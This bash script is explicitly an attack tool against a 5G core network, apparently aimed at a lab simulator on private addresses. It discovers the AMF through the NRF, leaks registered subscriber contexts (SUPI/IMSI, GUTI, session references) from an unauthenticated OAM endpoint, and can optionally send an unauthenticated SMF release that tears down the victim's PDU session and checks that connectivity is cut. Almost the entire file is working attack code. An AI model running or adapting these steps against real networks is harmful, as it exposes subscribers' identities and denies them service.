#!/usr/bin/env bash
set -e

AMF_SBI="http://10.0.0.18:8000"
NRF_SBI="http://10.0.0.10:8000"
SMF_SBI="http://10.0.0.2:8000"

echo "============================================================"
echo "    5G CONTROL PLANE ATTACK: AMF RECON & SESSION HIJACK     "
echo "============================================================"

# Verify connectivity to Core SBI dummy subnet
if ! ping -c 1 -W 2 10.0.0.18 >/dev/null 2>&1; then
    echo "[-] Error: Cannot reach AMF SBI (10.0.0.18)."
    echo "    Make sure 'sudo ./setup_and_start_ue.sh' was run to establish routing."
    exit 1
fi

echo ""
echo "[*] PHASE 1: NRF Reconnaissance (Discovering AMF Network Function)"
echo "------------------------------------------------------------"
# Discover registered Network Functions via NRF
NF_DISCOVERY=$(curl -s -m 4 "$NRF_SBI/nnrf-nfm/v1/nf-instances?nf-type=AMF" || true)
if [ -n "$NF_DISCOVERY" ] && [ "$NF_DISCOVERY" != "null" ]; then
    echo "[+] Discovered AMF NF Instance Profile:"
    echo "$NF_DISCOVERY" | jq . 2>/dev/null || echo "$NF_DISCOVERY"
else
    echo "[*] Direct NRF NF-Instances query returned empty. Querying AMF directly..."
fi

echo ""
echo "[*] PHASE 2: Unauthenticated AMF OAM Context Leak (namf-oam)"
echo "------------------------------------------------------------"
CONTEXTS=$(curl -s -m 4 "$AMF_SBI/namf-oam/v1/registered-ue-context")

if [ -z "$CONTEXTS" ] || [ "$CONTEXTS" == "null" ] || [ "$CONTEXTS" == "[]" ]; then
    echo "[-] No registered UE contexts found. Make sure the UE simulator is connected."
    exit 1
fi

echo "[+] Successfully leaked active UE context data from AMF:"
echo "$CONTEXTS" | jq .

# Parse critical targeting parameters
SUPI=$(echo "$CONTEXTS" | jq -r '.[0].Supi')
GUTI=$(echo "$CONTEXTS" | jq -r '.[0].Guti')
SM_REF=$(echo "$CONTEXTS" | jq -r '.[0].PduSessions[0].SmContextRef')
PDU_ID=$(echo "$CONTEXTS" | jq -r '.[0].PduSessions[0].PduSessionId')
DNN=$(echo "$CONTEXTS" | jq -r '.[0].PduSessions[0].Dnn')

echo ""
echo "============================================================"
echo " [!] PARSED SUBSCRIBER TARGET DATA:"
echo "     - Target SUPI (IMSI):  $SUPI"
echo "     - Allocated 5G-GUTI:   $GUTI"
echo "     - Active DNN:          $DNN (PDU ID: $PDU_ID)"
echo "     - Target SmContextRef: $SM_REF"
echo "============================================================"

# Optional Denial of Service / Session Release trigger
echo ""
read -p "[?] Do you want to execute rogue PDU Session Teardown against this UE? (y/N): " EXEC_TEARDOWN

if [[ "$EXEC_TEARDOWN" =~ ^[Yy]$ ]]; then
    if [ "$SM_REF" == "null" ] || [ -z "$SM_REF" ]; then
        echo "[-] Error: No active SmContextRef found to terminate."
        exit 1
    fi

    echo "[*] PHASE 3: Exploiting SMF (nsmf-pdusession) to Tear Down Session"
    echo "[+] Sending unauthenticated release request to: $SMF_SBI/nsmf-pdusession/v1/sm-contexts/${SM_REF}/release"
    
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
      "$SMF_SBI/nsmf-pdusession/v1/sm-contexts/${SM_REF}/release" \
      -H "Content-Type: application/json" \
      -d '{"cause": "PDU_SESSION_STATUS_MISMATCH"}')

    echo "[+] SMF Response Code: HTTP $HTTP_CODE"
    if [ "$HTTP_CODE" -eq 200 ] || [ "$HTTP_CODE" -eq 204 ]; then
        echo "[SUCCESS] PDU Session terminated remotely!"
        echo "[*] Verifying data-plane disruption on uesimtun0..."
        if ! ping -c 2 -W 1 -I uesimtun0 8.8.8.8 >/dev/null 2>&1; then
            echo "[CONFIRMED] 5G data-plane severed! Internet traffic through uesimtun0 has died."
        fi
    else
        echo "[-] SMF did not accept release. Inspect SMF logs on core server."
    fi
fi
